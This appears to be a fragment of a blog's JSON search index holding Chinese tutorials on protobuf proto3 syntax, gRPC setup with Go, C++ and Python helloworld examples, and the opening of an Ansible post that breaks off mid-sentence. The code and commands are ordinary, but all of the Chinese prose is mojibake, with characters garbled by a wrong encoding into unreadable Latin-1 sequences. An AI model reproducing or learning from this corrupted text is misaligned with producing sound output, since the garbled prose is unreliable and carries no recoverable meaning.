å°†å…·æœ‰`enum`Javaæˆ–C ++ çš„ç›¸åº”ä»£ç ï¼Œè¿™`EnumDescriptor`æ˜¯Pythonçš„ä¸€ä¸ªç‰¹æ®Šç±»ï¼Œç”¨äºåœ¨è¿è¡Œæ—¶ç”Ÿæˆçš„ç±»ä¸­åˆ›å»ºä¸€ç»„å¸¦æœ‰æ•´æ•°å€¼çš„ç¬¦å·å¸¸é‡ã€‚\n\nåœ¨ååºåˆ—åŒ–æœŸé—´ï¼Œå°†åœ¨æ¶ˆæ¯ä¸­ä¿ç•™æ— æ³•è¯†åˆ«çš„æšä¸¾å€¼ï¼Œä½†æ˜¯å½“ååºåˆ—åŒ–æ¶ˆæ¯æ—¶ï¼Œå¦‚ä½•è¡¨ç¤ºè¿™ç§å€¼å–å†³äºè¯­è¨€ã€‚åœ¨æ”¯æŒå…·æœ‰è¶…å‡ºæŒ‡å®šç¬¦å·èŒƒå›´çš„å€¼çš„å¼€æ”¾æšä¸¾ç±»å‹çš„è¯­è¨€ä¸­ï¼Œä¾‹å¦‚C ++å’ŒGoï¼ŒæœªçŸ¥çš„æšä¸¾å€¼ä»…ä½œä¸ºå…¶åŸºç¡€æ•´æ•°è¡¨ç¤ºå­˜å‚¨ã€‚åœ¨å…·æœ‰å°é—­æšä¸¾ç±»å‹ï¼ˆå¦‚Javaï¼‰çš„è¯­è¨€ä¸­ï¼Œæšä¸¾ä¸­çš„å¤§å°å†™ç”¨äºè¡¨ç¤ºæ— æ³•è¯†åˆ«çš„å€¼ï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨ç‰¹æ®Šè®¿é—®å™¨è®¿é—®åŸºç¡€æ•´æ•°ã€‚åœ¨ä»»ä½•ä¸€ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæ¶ˆæ¯è¢«åºåˆ—åŒ–ï¼Œåˆ™ä»ç„¶ä¼šä½¿ç”¨æ¶ˆæ¯åºåˆ—åŒ–æ— æ³•è¯†åˆ«çš„å€¼ã€‚\n\næœ‰å…³å¦‚ä½•`enum`åœ¨åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨æ¶ˆæ¯çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…æ‰€é€‰è¯­è¨€çš„[ç”Ÿæˆä»£ç æŒ‡å—](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)ã€‚\n\n\n\n##### 4.1 ä¿ç•™å€¼\n\nå¦‚æœé€šè¿‡å®Œå…¨åˆ é™¤æšä¸¾æ¡ç›®æˆ–å°†å…¶æ³¨é‡Šæ‰æ¥[æ›´æ–°](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23updating)æšä¸¾ç±»å‹ï¼Œåˆ™æœªæ¥ç”¨æˆ·å¯ä»¥åœ¨å¯¹ç±»å‹è¿›è¡Œè‡ªå·±çš„æ›´æ–°æ—¶é‡ç”¨è¯¥æ•°å€¼ã€‚å¦‚æœä»¥ååŠ è½½ç›¸åŒçš„æ—§ç‰ˆæœ¬ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´ä¸¥é‡é—®é¢˜`.proto`ï¼ŒåŒ…æ‹¬æ•°æ®æŸåï¼Œéšç§é”™è¯¯ç­‰ã€‚ç¡®ä¿ä¸ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µçš„ä¸€ç§æ–¹æ³•æ˜¯æŒ‡å®šå·²åˆ é™¤æ¡ç›®çš„æ•°å€¼ï¼ˆå’Œ/æˆ–åç§°ï¼Œè¿™ä¹Ÿå¯èƒ½å¯¼è‡´JSONåºåˆ—åŒ–é—®é¢˜ï¼‰`reserved`ã€‚å¦‚æœå°†æ¥çš„ä»»ä½•ç”¨æˆ·å°è¯•ä½¿ç”¨è¿™äº›æ ‡è¯†ç¬¦ï¼Œåè®®ç¼“å†²ç¼–è¯‘å™¨å°†ä¼šæŠ±æ€¨ã€‚æ‚¨å¯ä»¥ä½¿ç”¨`max`å…³é”®å­—æŒ‡å®šä¿ç•™çš„æ•°å€¼èŒƒå›´è¾¾åˆ°æœ€å¤§å¯èƒ½å€¼ã€‚\n\n```protobuf\nenum Foo {\n  reserved 2, 15, 9 to 11, 40 to max;\n  reserved \"FOO\", \"BAR\";\n}\n```\n\nè¯·æ³¨æ„ï¼Œæ‚¨ä¸èƒ½åœ¨åŒä¸€`reserved`è¯­å¥ä¸­æ··åˆå­—æ®µåç§°å’Œæ•°å€¼ã€‚\n\n\n\n### 5. ä½¿ç”¨å…¶ä»–æ¶ˆæ¯ç±»å‹\n\næ‚¨å¯ä»¥ä½¿ç”¨å…¶ä»–æ¶ˆæ¯ç±»å‹ä½œä¸ºå­—æ®µç±»å‹ã€‚ä¾‹å¦‚ï¼Œå‡è®¾ä½ æƒ³åŒ…æ‹¬`Result`æ¯ä¸ªæ¶ˆæ¯çš„`SearchResponse`æ¶ˆæ¯-è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œä½ å¯ä»¥å®šä¹‰ä¸€ä¸ª`Result`åœ¨åŒä¸€ä¸ªæ¶ˆæ¯ç±»å‹`.proto`ï¼Œç„¶åæŒ‡å®šç±»å‹çš„å­—æ®µ`Result`ä¸­`SearchResponse`ï¼š\n\n```protobuf\nmessage SearchResponse {\n  repeated Result results = 1;\n}\n\nmessage Result {\n  string url = 1;\n  string title = 2;\n  repeated string snippets = 3;\n}\n```\n\n\n\n##### 5.1 å¯¼å…¥å®šä¹‰\n\nåœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œ`Result`æ¶ˆæ¯ç±»å‹åœ¨åŒä¸€æ–‡ä»¶ä¸­å®šä¹‰`SearchResponse`- å¦‚æœè¦ç”¨ä½œå­—æ®µç±»å‹çš„æ¶ˆæ¯ç±»å‹å·²åœ¨å¦ä¸€ä¸ª`.proto`æ–‡ä»¶ä¸­å®šä¹‰ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿ\n\næ‚¨å¯ä»¥`.proto`é€šè¿‡*å¯¼å…¥*æ¥ä½¿ç”¨å…¶ä»–æ–‡ä»¶ä¸­çš„å®šä¹‰ã€‚è¦å¯¼å…¥å…¶ä»–`.proto`äººçš„å®šä¹‰ï¼Œè¯·åœ¨æ–‡ä»¶é¡¶éƒ¨æ·»åŠ importè¯­å¥ï¼š\n\n```protobuf\nimport \"myproject/other_protos.proto\";\n```\n\né»˜è®¤æƒ…å†µä¸‹ï¼Œæ‚¨åªèƒ½ä½¿ç”¨ç›´æ¥å¯¼å…¥`.proto`æ–‡ä»¶ä¸­çš„å®šä¹‰ã€‚ä½†æ˜¯ï¼Œæœ‰æ—¶æ‚¨å¯èƒ½éœ€è¦å°†`.proto`æ–‡ä»¶ç§»åŠ¨åˆ°æ–°ä½ç½®ã€‚`.proto`ç°åœ¨ï¼Œæ‚¨å¯ä»¥`.proto`åœ¨æ—§ä½ç½®æ”¾ç½®ä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ï¼Œä»¥ä½¿ç”¨è¯¥`import public`æ¦‚å¿µå°†æ‰€æœ‰å¯¼å…¥è½¬å‘åˆ°æ–°ä½ç½®ï¼Œè€Œä¸æ˜¯ç›´æ¥ç§»åŠ¨æ–‡ä»¶å¹¶åœ¨ä¸€æ¬¡æ›´æ”¹ä¸­æ›´æ–°æ‰€æœ‰è°ƒç”¨ç«™ç‚¹ã€‚`import public`ä»»ä½•å¯¼å…¥åŒ…å«è¯¥`import public`è¯­å¥çš„protoçš„äººéƒ½å¯ä»¥ä¼ é€’ä¾èµ–å…³ç³»ã€‚ä¾‹å¦‚ï¼š\n\n```protobuf\n// new.proto\n// All definitions are moved here\n\n// old.proto\n//This is the proto that all clients are importing.\nimport publicâ€œnew.protoâ€;\nimportâ€œother.protoâ€;\n\n// client.proto\nimport \"old.proto\";\n//æ‚¨ä½¿ç”¨old.protoå’Œnew.protoä¸­çš„å®šä¹‰ï¼Œä½†ä¸ä½¿ç”¨other.proto\n```\n\nåè®®ç¼–è¯‘å™¨ä½¿ç”¨`-I`/ `--proto_path`flag åœ¨åè®®ç¼–è¯‘å™¨å‘½ä»¤è¡Œä¸­æŒ‡å®šçš„ä¸€ç»„ç›®å½•ä¸­æœç´¢å¯¼å…¥çš„æ–‡ä»¶ ã€‚å¦‚æœæ²¡æœ‰ç»™å‡ºæ ‡å¿—ï¼Œå®ƒå°†æŸ¥æ‰¾è°ƒç”¨ç¼–è¯‘å™¨çš„ç›®å½•ã€‚é€šå¸¸ï¼Œæ‚¨åº”è¯¥å°†`--proto_path`æ ‡å¿—è®¾ç½®ä¸ºé¡¹ç›®çš„æ ¹ç›®å½•ï¼Œå¹¶å¯¹æ‰€æœ‰å¯¼å…¥ä½¿ç”¨å®Œå…¨é™å®šåç§°ã€‚\n\n##### 5.2 ä½¿ç”¨proto2æ¶ˆæ¯ç±»å‹\n\nå¯ä»¥å¯¼å…¥[proto2](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto)æ¶ˆæ¯ç±»å‹å¹¶åœ¨proto3æ¶ˆæ¯ä¸­ä½¿ç”¨å®ƒä»¬ï¼Œåä¹‹äº¦ç„¶ã€‚ä½†æ˜¯ï¼Œproto2æšä¸¾ä¸èƒ½ç›´æ¥ç”¨äºproto3è¯­æ³•ï¼ˆå¦‚æœå¯¼å…¥çš„proto2æ¶ˆæ¯ä½¿ç”¨å®ƒä»¬å°±å¯ä»¥äº†ï¼‰ã€‚\n\n\n\n### 6. åµŒå¥—ç±»å‹\n\næ‚¨å¯ä»¥åœ¨å…¶ä»–æ¶ˆæ¯ç±»å‹ä¸­å®šä¹‰å’Œä½¿ç”¨æ¶ˆæ¯ç±»å‹ï¼Œå¦‚ä¸‹ä¾‹æ‰€ç¤º - æ­¤å¤„`Result`æ¶ˆæ¯åœ¨æ¶ˆæ¯ä¸­å®šä¹‰`SearchResponse`ï¼š\n\n```protobuf\nmessage SearchResponse {\n  message Result {\n    string url = 1;\n    string title = 2;\n    repeated string snippets = 3;\n  }\n  repeated Result results = 1;\n}\n```\n\nå¦‚æœè¦åœ¨å…¶çˆ¶æ¶ˆæ¯ç±»å‹ä¹‹å¤–é‡ç”¨æ­¤æ¶ˆæ¯ç±»å‹ï¼Œè¯·å°†å…¶ç§°ä¸ºï¼š `*Parent*.*Type*`\n\n```protobuf\nmessage SomeOtherMessage {\n  SearchResponse.Result result = 1;\n}\n```\n\næ‚¨å¯ä»¥æ ¹æ®éœ€è¦æ·±å…¥åµŒå¥—æ¶ˆæ¯ï¼š\n\n```protobuf\nmessage Outer {       // Level 0\n  message MiddleAA {  // Level 1\n    message Inner {   // Level 2\n      int64 ival = 1;\n      bool  booly = 2;\n    }\n  }\n  message MiddleBB {  // Level 1\n    message Inner {   // Level 2\n      int32 ival = 1;\n      bool  booly = 2;\n    }\n  }\n}\n```\n\n\n","tags":["protobuf"],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"grpcçš„å®æˆ˜","url":"%2Fp%2Fc0435795.html","content":"\n# 1. å®‰è£…\n\n### 1. 1 ä¸‹è½½protoc ç”Ÿæˆå™¨\n\né€šè¿‡protoæ–‡ä»¶ï¼Œç”Ÿæˆç›¸å…³ä»£ç ã€‚ä¸‹è½½åœ°å€ï¼šhttps://github.com/protocolbuffers/protobuf/releases\n\nä¾‹å¦‚æˆ‘ä¸‹è½½çš„æ˜¯ [protoc-3.9.0-osx-x86_64.zip](https://github.com/protocolbuffers/protobuf/releases/download/v3.9.0/protoc-3.9.0-osx-x86_64.zip)\n\n```bash\ncd protoc-3.9.0-osx-x86_64 \ncp -r include/ /usr/local/include/ \ncp -r bin/ /usr/local/bin/\nprotoc --version\n```\n\n<!-- more -->\n\n# 2. ä½¿ç”¨\n\nhelloworld.proto æ–‡ä»¶å¦‚ä¸‹\n\n```protobuf\nsyntax = \"proto3\";\n\noption java_multiple_files = true;\noption java_package = \"io.grpc.examples.helloworld\";\noption java_outer_classname = \"HelloWorldProto\";\n\npackage helloworld;\n\n// The greeting service definition.\nservice Greeter {\n  // Sends a greeting\n  rpc SayHello (HelloRequest) returns (HelloReply) {}\n}\n\n// The request message containing the user's name.\nmessage HelloRequest {\n  string name = 1;\n}\n\n// The response message containing the greetings\nmessage HelloReply {\n  string message = 1;\n}\n```\n\n### 2.1 golang\n\n```bash\ngo get -u google.golang.org/grpc\ngo get -u github.com/golang/protobuf/protoc-gen-go\n```\n\næˆ‘ä»¬å» `$GOPATH/src/google.golang.org/grpc/examples` çœ‹helloworldä¾‹å­\n\n```bash\ncd $GOPATH/src/google.golang.org/grpc/examples/helloworld\n```\n\næˆ‘ä»¬é€šè¿‡.protoæ–‡ä»¶ç”Ÿæˆgolangæ–‡ä»¶, ç”Ÿæˆåçš„æ–‡ä»¶ä¸è¦ç¼–è¾‘ã€‚\n\n```sh\nprotoc -I helloworld/ helloworld/helloworld.proto --go_out=plugins=grpc:helloworld\n\n# è·å–è¿›å…¥åˆ°helloworldç›®å½•é‡Œ\nprotoc helloworld.proto --go_out=plugins=grpc:. \n```\n\nè¿è¡Œåç”Ÿæˆäº† helloworld.pb.go\n\n##### client å’Œ server è°ƒç”¨\n\næˆ‘ä»¬çœ‹ä¸‹`greeter_server` çš„ä»£ç å¹¶ä¸”å¯åŠ¨: `go run greeter_server/main.go`\n\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"log\"\n\t\"net\"\n\n\t\"google.golang.org/grpc\"\n\tpb \"google.golang.org/grpc/examples/helloworld/helloworld\"\n)\n\nconst (\n\tport = \":50051\"\n)\n\n// server is used to implement helloworld.GreeterServer.\ntype server struct{}\n\n// SayHello implements helloworld.GreeterServer\nfunc (s *server) SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, error) {\n\tlog.Printf(\"Received: %v\", in.Name)\n\treturn &pb.HelloReply{Message: \"Hello \" + in.Name}, nil\n}\n\nfunc main() {\n\tlis, err := net.Listen(\"tcp\", port)\n\tif err != nil {\n\t\tlog.Fatalf(\"failed to listen: %v\", err)\n\t}\n\ts := grpc.NewServer()\n\tpb.RegisterGreeterServer(s, &server{})\n\tif err := s.Serve(lis); err != nil {\n\t\tlog.Fatalf(\"failed to serve: %v\", err)\n\t}\n}\n```\n\n\n\næˆ‘ä»¬çœ‹ä¸‹`greeter_client`çš„ä»£ç å¹¶ä¸”å¯åŠ¨:` go run greeter_client/main.go`\n\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"log\"\n\t\"os\"\n\t\"time\"\n\n\t\"google.golang.org/grpc\"\n\tpb \"google.golang.org/grpc/examples/helloworld/helloworld\"\n)\n\nconst (\n\taddress     = \"localhost:50051\"\n\tdefaultName = \"world\"\n)\n\nfunc main() {\n\t// Set up a connection to the server.\n\tconn, err := grpc.Dial(address, grpc.WithInsecure())\n\tif err != nil {\n\t\tlog.Fatalf(\"did not connect: %v\", err)\n\t}\n\tdefer conn.Close()\n\tc := pb.NewGreeterClient(conn)\n\n\t// Contact the server and print out its response.\n\tname := defaultName\n\tif len(os.Args) > 1 {\n\t\tname = os.Args[1]\n\t}\n\tctx, cancel := context.WithTimeout(context.Background(), time.Second)\n\tdefer cancel()\n\tr, err := c.SayHello(ctx, &pb.HelloRequest{Name: name})\n\tif err != nil {\n\t\tlog.Fatalf(\"could not greet: %v\", err)\n\t}\n\tlog.Printf(\"Greeting: %s\", r.Message)\n}\n```\n\n\n\nIf things go smoothly, you will see the `Greeting: Hello world` in the client side output.\n\nCongratulations! Youâ€™ve just run a client-server application with gRPC.\n\n\n\n##### å¢åŠ æ–°çš„æ–¹æ³•å®ç°\n\n1. åœ¨protoæ–‡ä»¶é‡Œå¢åŠ  `rpc SayHelloAgain (HelloRequest) returns (HelloReply) {}`çš„å®šä¹‰\n2. é€šè¿‡protocé‡æ–°ç”Ÿæˆgolangæ–‡ä»¶, ç”Ÿæˆçš„æ–‡ä»¶é‡Œå¢åŠ äº†SayHelloAgainç›¸å…³æ–¹æ³•ã€‚\n\n\n\n1. ä¿®æ”¹serveræ–‡ä»¶å¢åŠ æ–¹æ³•æ¥å®ç°æ¥å£\n\n```go\nfunc (s *server) SayHelloAgain(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, error) {\n        return &pb.HelloReply{Message: \"Hello again \" + in.Name}, nil\n}\n```\n\n2. ä¿®æ”¹clientæ–¹æ³•å¢åŠ è°ƒç”¨\n\n```go\nr, err = c.SayHelloAgain(ctx, &pb.HelloRequest{Name: name})\nif err != nil {\n        log.Fatalf(\"could not greet: %v\", err)\n}\nlog.Printf(\"Greeting: %s\", r.Message)\n```\n\n### 2.2 cpp ç‰ˆæœ¬\n\nå‚è€ƒ: https://github.com/grpc/grpc/blob/master/BUILDING.md\n\n```bash\n# å®‰è£…xcode command line tools\nsudo xcode-select --install\n# å…ˆå®‰è£…å¿…å¤‡çš„è½¯ä»¶\nbrew install autoconf automake libtool shtool gflags\n\n# ä¸‹è½½å®˜æ–¹ä»£ç å¹¶æ›´æ–°ä¾èµ–\ngit clone https://github.com/grpc/grpc\ngit submodule update --init\n\n# ç¼–è¯‘å¹¶ä¸”å®‰è£…\nLIBTOOL=glibtool LIBTOOLIZE=glibtoolize make\nsudo make install\n```\n\næˆ‘ä»¬å…ˆè¿›å…¥hellworldä¾‹å­\n\n```bash\ncd examples/cpp/hellworld/\nmake\n\n# makeè¿‡ç¨‹ä¸­å¯ä»¥çœ‹åˆ°ä¼šå…ˆç”Ÿæˆhelloworld.pb.cc\nprotoc -I ../../protos --cpp_out=. ../../protos/helloworld.proto\n```\n\nè¿˜å¯ä»¥è¿™æ ·ç”Ÿæˆ:\n\n```bash\nprotoc --cpp_out=. helloworld.proto\nprotoc --grpc_out=. --plugin=protoc-gen-grpc=`which grpc_cpp_plugin` helloworld.proto\n```\n\n### 2.3 pythonç‰ˆæœ¬\n\n```bash\nsudo python3 -m pip install grpcio\nsudo python3 -m pip install grpcio-tools\npython3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. helloworld.proto\n```\n\n\n\n# 3. grpcé—®é¢˜\n\n### 3.1 é€šä¿¡æ–¹å¼\n\ngRPC å…è®¸ä½ å®šä¹‰å››ç±»æœåŠ¡æ–¹æ³•:\n\n   1. ç®€å•RPCï¼ˆSimple RPCï¼‰ï¼šå³å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªè¯·æ±‚ç»™æœåŠ¡ç«¯ï¼Œä»æœåŠ¡ç«¯è·å–ä¸€ä¸ªåº”ç­”ï¼Œå°±åƒä¸€æ¬¡æ™®é€šçš„å‡½æ•°è°ƒç”¨ã€‚\n\n      ```\n      rpc SayHello(HelloRequest) returns (HelloResponse){\n      }\n      ```\n\n   2. æœåŠ¡ç«¯æµå¼RPCï¼ˆServer-side streaming RPCï¼‰ï¼šä¸€ä¸ªè¯·æ±‚å¯¹è±¡ï¼ŒæœåŠ¡ç«¯å¯ä»¥ä¼ å›å¤šä¸ªç»“æœå¯¹è±¡ã€‚å³å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªè¯·æ±‚ç»™æœåŠ¡ç«¯ï¼Œå¯è·å–ä¸€ä¸ªæ•°æ®æµç”¨æ¥è¯»å–ä¸€ç³»åˆ—æ¶ˆæ¯ã€‚å®¢æˆ·ç«¯ä»è¿”å›çš„æ•°æ®æµé‡Œä¸€ç›´è¯»å–ç›´åˆ°æ²¡æœ‰æ›´å¤šæ¶ˆæ¯ä¸ºæ­¢ã€‚\n\n      ```\n      rpc LotsOfReplies(HelloRequest) returns (stream HelloResponse){\n      }\n      ```\n\n   3. å®¢æˆ·ç«¯æµå¼RPCï¼ˆClient-side streaming RPCï¼‰ï¼šå®¢æˆ·ç«¯ä¼ å…¥å¤šä¸ªè¯·æ±‚å¯¹è±¡ï¼ŒæœåŠ¡ç«¯è¿”å›ä¸€ä¸ªå“åº”ç»“æœã€‚å³å®¢æˆ·ç«¯ç”¨æä¾›çš„ä¸€ä¸ªæ•°æ®æµå†™å…¥å¹¶å‘é€ä¸€ç³»åˆ—æ¶ˆæ¯ç»™æœåŠ¡ç«¯ã€‚ä¸€æ—¦å®¢æˆ·ç«¯å®Œæˆæ¶ˆæ¯å†™å…¥ï¼Œå°±ç­‰å¾…æœåŠ¡ç«¯è¯»å–è¿™äº›æ¶ˆæ¯å¹¶è¿”å›åº”ç­”ã€‚\n\n      ```\n      rpc LotsOfGreetings(stream HelloRequest) returns (HelloResponse) {\n      }\n      ```\n\n      \n\n   4. åŒå‘æµå¼RPCï¼ˆBidirectional streaming RPCï¼‰ï¼šç»“åˆå®¢æˆ·ç«¯æµå¼rpcå’ŒæœåŠ¡ç«¯æµå¼rpcï¼Œå¯ä»¥ä¼ å…¥å¤šä¸ªå¯¹è±¡ï¼Œè¿”å›å¤šä¸ªå“åº”å¯¹è±¡ã€‚å³ä¸¤è¾¹éƒ½å¯ä»¥åˆ†åˆ«é€šè¿‡ä¸€ä¸ªè¯»å†™æ•°æ®æµæ¥å‘é€ä¸€ç³»åˆ—æ¶ˆæ¯ã€‚è¿™ä¸¤ä¸ªæ•°æ®æµæ“ä½œæ˜¯ç›¸äº’ç‹¬ç«‹çš„ï¼Œæ‰€ä»¥å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯èƒ½æŒ‰å…¶å¸Œæœ›çš„ä»»æ„é¡ºåºè¯»å†™ã€‚\n\n      ```\n      rpc BidiHello(stream HelloRequest) returns (stream HelloResponse){\n      }\n      ```\n\n### 3.2 è¶…æ—¶\n\ngoé‡Œé¢ä¸€èˆ¬ä¼šä½¿ç”¨Contextè¿›è¡Œè¶…æ—¶æ§åˆ¶ä»¥åŠå‚æ•°ä¼ é€’, å…¶ä¸­è¶…æ—¶æ§åˆ¶å¯ä»¥ä½¿ç”¨context.WithDeadline()æˆ–è€…context.WithTimeout()å®ç°, äºŒè€…å®ç°æ•ˆæœæ˜¯ä¸€è‡´çš„ã€‚\n\ngRPCåŸºæœ¬ä¸Šæ‰€æœ‰çš„å¯¹å¤–å‡½æ•°éƒ½æ˜¯å¸¦contextå‚æ•°çš„, æ‰€ä»¥è¯´å®ƒé»˜è®¤å°±é›†æˆäº†contextçš„åŠŸèƒ½, æˆ‘ä»¬åªéœ€è¦åœ¨è°ƒç”¨æ–¹æ³•çš„æ—¶å€™ä¼ å…¥ ctx å‚æ•°ä¾¿å¯ã€‚\n\n+ WithTimeout åªèƒ½è®¾ç½®åœ¨æŸä¸€æ®µæ—¶é—´åè¶…æ—¶ï¼Œæ¯”å¦‚3ç§’åè¶…æ—¶ã€‚\n\n+ WithDeadline() åˆ™å¯ä»¥è®¾ç½®åˆ°å…·ä½“æŸä¸ªæ—¶é—´ç‚¹, æ¯”å¦‚åœ¨ä¸´æ™¨0ç‚¹10åˆ†20ç§’çš„æ—¶å€™è¿”å›ã€‚\n\n### 3.3 é‡è¯•\n\ngRPC ä¸­å·²ç»å†…ç½®äº† retry åŠŸèƒ½ï¼Œå®¢æˆ·ç«¯éœ€è¦é€šè¿‡`grpc.WithDefaultServiceConfig()`é…ç½® retry åŠŸèƒ½, å¹¶ä¸”è®¾ç½®ç¯å¢ƒå˜é‡`export GRPC_GO_RETRY=on`\n\n+ client.go\n\n```go\nfunc main() {\n\t// method å¯ä»¥ä¸æŒ‡å®š å³å½“å‰serviceä¸‹çš„æ‰€ä»¥æ–¹æ³•éƒ½ä½¿ç”¨è¯¥é…ç½®ã€‚\n\tretryPolicy := `{\n\t\t\"methodConfig\": [{\n\t\t  \"name\": [{\"service\": \"pb.Greeter\",\"method\":\"SayHello\"}],\n\t\t  \"retryPolicy\": {\n\t\t\t  \"MaxAttempts\": 4,\n\t\t\t  \"InitialBackoff\": \".01s\",\n\t\t\t  \"MaxBackoff\": \".01s\",\n\t\t\t  \"BackoffMultiplier\": 1.0,\n\t\t\t  \"RetryableStatusCodes\": [ \"UNAVAILABLE\" ]\n\t\t  }\n\t\t}]}`\n\n\tconn, err := grpc.Dial(address,grpc.WithDefaultServiceConfig(retryPolicy))\n\tif err != nil {\n\t\tlog.Fatalf(\"did not connect: %v\", err)\n\t}\n\tdefer conn.Close()\n}  \n```\n\n### 3.4 æ‹¦æˆªå™¨\n\næ‹¦æˆªå™¨ï¼ˆinterceptorï¼‰æ˜¯grpcæä¾›ç»™å¼€å‘è€…ä¾¿äºåœ¨æ¯ä¸ªRPCè¯·æ±‚å‰ä¸­åè¿›è¡Œå¦‚è®¤è¯ã€é‰´æƒã€ç»Ÿè®¡ç­‰åŠŸèƒ½çš„æœºåˆ¶ï¼Œç†Ÿæ‚‰Ginæ¡†æ¶çš„åŒå­¦çš„å¯ä»¥æŠŠæ‹¦æˆªå™¨ç†è§£ä¸ºgin.HandlerFuncä¸­é—´ä»¶ï¼Œåªä¸è¿‡grpcç”±äºæ˜¯åŒå‘é€šä¿¡ï¼Œæ‰€ä»¥å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éƒ½å¯ä»¥ä½¿ç”¨interceptorã€‚\n\næ‹¦æˆªå™¨ä¸»è¦åˆ’åˆ†ä¸ºä¸¤ç§ï¼Œä¸€å…ƒæ‹¦æˆªå™¨ï¼ˆunary interceptorï¼‰å’Œæµæ‹¦æˆªå™¨ï¼ˆstream interceptorï¼‰ï¼ŒåŒºåˆ«å°±æ˜¯åœ¨äºæœ‰æ²¡æœ‰rpcä½¿ç”¨streamã€‚\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n- https://grpc.io/docs/quickstart/\n- https://github.com/grpc-ecosystem/go-grpc-middleware\n- https://github.com/openzipkin/zipkin","tags":["grpc"],"categories":["4_golangå®æˆ˜"]},{"title":"ansibleéƒ¨ç½²çš„å®è·µ","url":"%2Fp%2F18605da6.html","content":"\n\n\n### 1. ansible å®‰è£…\n\nåœ¨ ansible çš„ä¸–ç•Œé‡Œï¼Œæˆ‘ä»¬ä¼šé€šè¿‡ inventory æ¡£æ¡ˆæ¥å®šä¹‰æœ‰å“ªäº› managed node (è¢«æ§ç«¯)ï¼Œå¹¶å€Ÿç”± ssh å’Œ python è¿›è¡Œæ²Ÿé€šã€‚æ¢å¥è¯è¯´ï¼Œå½“ control machine (ä¸»æ§ç«¯) å¯ä»¥ç”¨ ssh è¿ä¸Š managed nodeï¼Œä¸”è¢«è¿ä¸Šçš„æœºå™¨é‡Œæœ‰é¢„è½½ python æ—¶ï¼Œansile å°±å¯ä»¥è¿ä½œäº†.\n\n+ æ§åˆ¶ç«¯\n\n```bash\nsudo apt install ansible #linux\nbrew install ansible # mac\n```\n\n+ è¢«æ§ç«¯\n\n  è¦å®‰è£… python, å¹¶ä¸”èƒ½è¢«æ§åˆ¶ç«¯ ssh \n\n<!-- more -->\n\n### 2. ansible é…ç½®\n\nansibleçš„é»˜è®¤é…ç½®æ–‡ä»¶è·¯å¾„ä¸º /etc/ansibleï¼Œç„¶è€Œï¼Œä¸€ä¸ªå¸¸è§çš„ç”¨é€”æ˜¯å°†å…¶å®‰è£…åœ¨ä¸€ä¸ªvirtualenvä¸­ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¸ä¼šä½¿ç”¨è¿™äº›é»˜è®¤æ–‡ä»¶ã€‚æˆ‘ä»¬å¯ä»¥æ ¹æ®éœ€è¦åœ¨æœ¬åœ°ç›®å½•ä¸­åˆ›å»ºé…ç½®æ–‡ä»¶ã€‚\n\n##### 2.1 inventoryæ–‡ä»¶\n\næ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ªinventoryæ–‡ä»¶ï¼Œç”¨äºå®šä¹‰å°†è¦ç®¡ç†çš„æœåŠ¡å™¨ã€‚è¿™ä¸ªæ–‡ä»¶å¯ä»¥å‘½åä¸ºä»»ä½•åå­—ï¼Œä½†æˆ‘ä»¬é€šå¸¸ä¼šå‘½åä¸ºhostsæˆ–è€…é¡¹ç›®çš„åç§°ã€‚ \n\nåœ¨hostsæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€äº›è¦ç®¡ç†çš„æœåŠ¡å™¨ã€‚è¿™é‡Œæˆ‘ä»¬å°†å®šä¹‰æˆ‘ä»¬å¯èƒ½è¦åœ¨â€œwebâ€æ ‡ç­¾ä¸‹ç®¡ç†çš„ä¸¤ä¸ªæœåŠ¡å™¨ã€‚æ ‡ç­¾æ˜¯ä»»æ„çš„ã€‚\n\n```bash\n[web]\n192.168.22.10\n192.168.22.11\n```\n\nç°åœ¨ï¼Œè®©æˆ‘ä»¬å°†hostsæ–‡ä»¶è®¾ç½®ä¸ºæŒ‡å‘æœ¬åœ°ä¸»æœºlocalå’Œremoteè™šæ‹Ÿè¿œç¨‹ä¸»æœºã€‚ \n\n```bash\n[local]\n127.0.0.1\n\n[remote]\n192.168.1.2\n```\n\n### 3. ansible ä½¿ç”¨\n\næˆ‘ä»¬å¼€å§‹å¯¹æœåŠ¡å™¨è¿è¡Œä»»åŠ¡ã€‚ansibleä¼šå‡å®šä½ çš„æœåŠ¡å™¨å…·æœ‰sshè®¿é—®æƒé™ï¼Œé€šå¸¸åŸºäºssh-keyã€‚å› 